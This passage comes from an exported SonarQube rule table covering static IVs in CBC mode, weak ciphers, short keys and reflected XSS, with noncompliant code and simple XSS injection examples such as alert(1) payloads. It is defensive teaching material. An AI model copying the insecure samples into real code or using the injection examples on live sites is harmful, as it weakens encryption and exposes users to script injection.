  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/295">CWE-295 - Improper Certificate Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S3329">
              vbnet:S3329
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an
initialization vector (IV), also called a "starting variable" (SV).</p>
<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same
ciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
Imports System.IO
Imports System.Security.Cryptography

Public Sub Encrypt(key As Byte(), dataToEncrypt As Byte(), target As MemoryStream)
    Dim aes = New AesCryptoServiceProvider()

    Dim iv = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
    Dim encryptor = aes.CreateEncryptor(key, iv) ' Noncompliant

    Dim cryptoStream = New CryptoStream(target, encryptor, CryptoStreamMode.Write)
    Dim swEncrypt = New StreamWriter(cryptoStream)

    swEncrypt.Write(dataToEncrypt)
End Sub
</pre>
<h4>Compliant solution</h4>
<p>In this example, the code implicitly uses a number generator that is considered <strong>strong</strong>, thanks to <code>aes.IV</code>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
Imports System.IO
Imports System.Security.Cryptography

Public Sub Encrypt(key As Byte(), dataToEncrypt As Byte(), target As MemoryStream)
    Dim aes = New AesCryptoServiceProvider()

    Dim encryptor = aes.CreateEncryptor(key, aes.IV)

    Dim cryptoStream = New CryptoStream(target, encryptor, CryptoStreamMode.Write)
    Dim swEncrypt = New StreamWriter(cryptoStream)

    swEncrypt.Write(dataToEncrypt)
End Sub
</pre>
<h3>How does this work?</h3>
<h4>Use unique IVs</h4>
<p>To ensure high security, initialization vectors must meet two important criteria:</p>
<ul>
  <li> IVs must be unique for each encryption operation. </li>
  <li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li>
</ul>
<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>
<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br> It is that the same IV is used for multiple encryption
attempts.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/329">CWE-329 - Not Using an Unpredictable IV with CBC Mode</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/780">CWE-780 - Use of RSA Algorithm without OAEP</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5547">
              vbnet:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
Imports System.Security.Cryptography

Public Sub Encrypt()
    Dim SimpleDES As New DESCryptoServiceProvider() ' Noncompliant
End Sub
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
Imports System.Security.Cryptography

Public Sub Encrypt()
    Dim AES128ECB = Aes.Create()
End Sub
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4426">
              csharpsquid:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul>
  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>
  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul>
      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li>
    </ul>  </li>
</ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System;
using System.Security.Cryptography;

public void encrypt()
{
    var RsaCsp = new RSACryptoServiceProvider(); // Noncompliant
}
</pre>
<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
using System;
using System.Security.Cryptography;

public void encrypt()
{
    var DsaCsp = new DSACryptoServiceProvider(); // Noncompliant
}
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
using System;
using System.Security.Cryptography;

public void encrypt()
{
    ECDsa ecdsa = ECDsa.Create(ECCurve.NamedCurves.brainpoolP160t1); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System;
using System.Security.Cryptography;

public void encrypt()
{
    var RsaCsp = new RSACryptoServiceProvider(2048);
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
using System;
using System.Security.Cryptography;

public void encrypt()
{
    var Dsa = new DSACng(2048);
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
using System;
using System.Security.Cryptography;

public void encrypt()
{
    ECDsa ecdsa = ECDsa.Create(ECCurve.NamedCurves.nistP256);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of
<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>
<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve
parameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves
currently include:</p>
<ul>
  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>
  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>
  <li> Curve448. </li>
  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>
</ul>
<h3>Pitfalls</h3>
<h4>The KeySize Property is not a setter</h4>
<p>The following code is invalid:</p>
<pre>
 ----
     var RsaCsp = new RSACryptoServiceProvider();
     RsaCsp.KeySize = 2048;
----
</pre>
<p>The KeySize property of CryptoServiceProviders cannot be updated because the setter simply does not exist. This means that this line will not
perform any update on <code>KeySize</code>, and the compiler won’t raise an Exception when compiling it. This should not be considered a
workaround.<br> To change the key size, use one of the overloaded constructors with the desired key size instead.</p>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
"post-quantum") counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation">Learn more here</a>.</p>
<h2>Resources</h2>
<ul>
  <li> Documentation
    <ul>
      <li> NIST Documentation - <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf">NIST SP 800-186: Recommendations
      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>
      <li> IETF - <a href="https://datatracker.ietf.org/doc/html/rfc5639">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and
      Curve Generation</a> </li>
    </ul>  </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5131">
              javasecurity:S5131
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of
the victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back
to the user.</p>
<h2>Why is this an issue?</h2>
<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming
HTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>
<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own
browser.</p>
<p>A user with malicious intent carefully crafts the link beforehand.</p>
<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code
that can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Vandalism on the front-end website</h4>
<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and
theft of the benevolent user’s data.</p>
<h4>Identity spoofing</h4>
<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>
<h4>Record user activity</h4>
<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard
activity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For
example, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code
injection vulnerability in the admin control panel of a web application.</p>
<h2>How to fix it in JSP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to cross-site scripting because JSP does not auto-escape variables.</p>
<p>User input embedded in HTML code should be HTML-encoded to prevent the injection of additional code. This can be done with the <a
href="https://owasp.org/www-project-java-encoder/">OWASP Java Encoder</a> or similar libraries.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
&lt;%@page contentType="text/html" pageEncoding="UTF-8"%&gt;
&lt;%@taglib prefix="e" uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %&gt;
&lt;!doctype html&gt;
&lt;html&gt;
 &lt;body&gt;
  &lt;h1&gt;${param.title}&lt;/h1&gt;    &lt;!-- Noncompliant --&gt;
 &lt;/body&gt;
&lt;/html&gt;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
&lt;%@page contentType="text/html" pageEncoding="UTF-8"%&gt;
&lt;%@taglib prefix="e" uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %&gt;
&lt;!doctype html&gt;
&lt;html&gt;
 &lt;body&gt;
  &lt;h1&gt;${e:forHtml(param.title)}&lt;/h1&gt;
 &lt;/body&gt;
&lt;/html&gt;
</pre>
<h3>How does this work?</h3>
<p>Template engines are used by web applications to build HTML content. Template files contain static HTML as well as template language instruction.
These instructions allow, for example, to insert dynamic values into the document as the template is rendered.</p>
<h4>Encode data according to the HTML context</h4>
<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact
from the end user’s point of view but make it uninterpretable by web browsers.</p>
<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific
encoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>
<table>
  <colgroup>
    <col style="width: 25%;">
    <col style="width: 25%;">
    <col style="width: 25%;">
    <col style="width: 25%;">
  </colgroup>
  <thead>
    <tr>
      <th>Context</th>
      <th>Code example</th>
      <th>Exploit example</th>
      <th>Encoding</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td> <p>Inbetween tags</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div&gt;
  { data }
&lt;/div&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div&gt;
  &lt;script&gt;
    alert(1)
  &lt;/script&gt;
&lt;/div&gt;
</pre></td>
      <td> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>
        <ul>
          <li> &amp; → &amp;amp; </li>
          <li> &lt; → &amp;lt; </li>
          <li> &gt; → &amp;gt; </li>
          <li> " → &amp;quot; </li>
          <li> ' → &amp;#x27; </li>
        </ul> </td>
    </tr>
    <tr>
      <td> <p>In an attribute surrounded with single or double quotes</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div tag="{ data }"&gt;
  ...
&lt;/div&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div tag=""
     onmouseover="alert(1)"&gt;
  ...
&lt;/div&gt;
</pre></td>
      <td> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>
        <ul>
          <li> &amp; → &amp;amp; </li>
          <li> &lt; → &amp;lt; </li>
          <li> &gt; → &amp;gt; </li>
          <li> " → &amp;quot; </li>
          <li> ' → &amp;#x27; </li>
        </ul> </td>
    </tr>
    <tr>
      <td> <p>In an unquoted attribute</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div tag={ data }&gt;
  ...
&lt;/div&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div tag=foo
     onmouseover=alert(1)&gt;
  ...
&lt;/div&gt;
</pre></td>
      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p> </td>
    </tr>
    <tr>
      <td> <p>In a URL attribute</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;a href="{ data }"&gt;
  ...
&lt;/a&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;a href="javascript:alert(1)"&gt;
  ...
&lt;/a&gt;
</pre></td>
      <td> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>
      as a scheme.</p> </td>
    </tr>
    <tr>
      <td> <p>In a script block</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;script&gt;
  { data }
&lt;/script&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;script&gt;
  alert(1)
&lt;/script&gt;
</pre></td>
      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>
&lt;!doctype html&gt;
&lt;script data="{ data }"&gt;
  ...
&lt;/script&gt;
</pre></td>
    </tr>
  </tbody>
</table>
<p><code>org.owasp.encoder.Encode.forHtml</code> is the recommended method to encode HTML entities.</p>
<h3>Pitfalls</h3>
<h4>Content-types</h4>
<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to
cross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>
<ul>
  <li> application/mathml+xml </li>
  <li> application/rdf+xml </li>
  <li> application/vnd.wap.xhtml+xml </li>
  <li> application/xhtml+xml </li>
  <li> application/xml </li>
  <li> image/svg+xml </li>
  <li> multipart/x-mixed-replace </li>
  <li> text/html </li>
  <li> text/rdf </li>
  <li> text/xml </li>
  <li> text/xsl </li>
</ul>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is
sometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the
filters.</p>
<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is
trying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,
in the long run, is very difficult.</p>
<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of "javascript:" URI.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy (CSP) Header</h4>
<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to
<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt
to exploit XSS in the application.<br> <a href="https://web.dev/csp-xss/">Learn more here.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li>
  <li> <a href="https://javadoc.io/doc/org.owasp.encoder/encoder/latest/index.html">OWASP Encoder</a> </li>
  <li> <a href="https://spring.io/guides/gs/securing-web/">Spring.io, Securing a Web Application</a> </li>
  <li> <a href="https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html">Thymeleaf.org, Tutorial: Using Thymeleaf</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/wordpress-stored-xss-vulnerability">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li>
  <li> <a href="https://blog.sonarsource.com/ghost-admin-takeover">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>
  <li> <a href="https://samy.pl/myspace/">Samy Kamkar, The MySpace Worm</a> </li>
</ul>
<h3>Conference presentations</h3>
<ul>
  <li> <a href="https://www.youtube.com/watch?v=ksq7e6UUDag">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6321">
              azureresourcemanager:S6321
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Cloud platforms such as Azure support virtual firewalls that can be used to restrict access to services by controlling inbound and outbound
